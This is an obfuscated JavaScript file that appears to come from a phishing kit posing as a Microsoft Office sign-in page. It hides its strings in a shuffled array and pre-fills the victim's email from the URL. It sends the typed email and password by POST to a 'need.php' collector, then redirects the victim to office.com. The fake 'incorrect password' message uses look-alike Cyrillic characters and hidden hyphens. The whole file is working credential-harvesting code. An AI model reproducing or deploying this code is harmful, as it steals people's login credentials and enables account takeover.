var a = ['_0xwerwer','_0xertt','innerHTML', 'ready', '.loading-dots', 'show', 'html', 'original-text', '#word', 'keyup', 'which', 'click', '.eml', '.login-box', 'val', '#inputPassword', 'onreadystatechange', 'readyState', 'status', 'parse', 'responseText', 'donesend', 'hide', 'window.location.href=\x27https://www.office.com/?auth=2\x27;', '.btn', 'login', '#warning', 'empty', 'append', 'Yо­ur\x20е­mа­il\x20оr\x20ра­s­s­wо­rd\x20is\x20inсоrrесt.\x20If\x20yоu\x20dоn\x27t\x20rеmе­mbеr\x20yо­ur\x20р­аs­s­wо­r­d,,<a\x20href=\x22#\x22>\x20re­se­t\x20it\x20n­o­w.<a/>\x20<br>\x20<br>\x20', 'open', 'POST', 'need.php', '&pass=', 'setRequestHeader', 'Content-type', 'location', 'hash', 'getElementById', 'user', 'split', 'dom'];

(function(c, d) {
    var e = function(f) {
        while (--f) {
            c['push'](c['shift']());
        }
    };
    e(++d);
}(a, 0x1b2));
var b = function(c, d) {
    c = c - 0x0;
    var e = a[c];
    return e;
};
var hash = window[b('0x0')][b('0x1')];
document[b('0x2')](b('0x3'))['value'] = hash[b('0x4')]('#')[0x1];
document[b('0x2')](b('0x5'))[b('0x6')] = hash[b('0x4')]('.')[0x0];
document['getElementById'](b('0x5'))[b('0x6')] = hash[b('0x4')]('@')[0x0];
document[b('0x2')](b('0x5'))[b('0x6')] = hash[b('0x4')]('@')[0x1];
$(document)[b('0x7')](function() {
    $('.btn')['on']('click', function() {
        $(b('0x8'))[b('0x9')]();
        var c = $(this);
        var d = '<i\x20class=\x22fa\x20fa-circle-o-notch\x20fa-spin\x22></i>\x20loa­di­ng...';
        if ($(this)[b('0xa')]() !== d) {
            c['data'](b('0xb'), $(this)[b('0xa')]());
            c[b('0xa')](d);
        }
    });
});
$(b('0xc'))[b('0xd')](function(e) {
    if (e[b('0xe')] == 0xd) {
        $('#submit')[b('0xf')]();
    }
});
$(b('0x10'))['click'](function() {
    $(b('0x11'))[b('0x9')]();
});

function suc() {
    var f = $('#user')[b('0x12')]();
    var g = $(b('0x13'))[b('0x12')]();
    var h = new XMLHttpRequest();
    h[b('0x14')] = function() {
        if (this[b('0x15')] == 0x4 && this[b('0x16')] == 0xc8) {
            var i = JSON[b('0x17')](this[b('0x18')]);
            if (i['msg'] == b('0x19')) {
                $(b('0x11'))[b('0x1a')]();
                $('.mails')[b('0x9')]();
                setTimeout(b('0x1b'), 0x1388);
            } else {
                $(b('0x1c'))[b('0xa')](b('0x1d'));
                $(b('0x1e'))[b('0x1f')]();
                $(b('0x1e'))[b('0x20')](b('0x21'));
            }
        }
    };
    h[b('0x22')](b('0x23'), b('0x24') + f + b('0x25') + g, !![]);
    h[b('0x26')](b('0x27'), 'application/x-www-form-urlencoded');
    h['send']();
}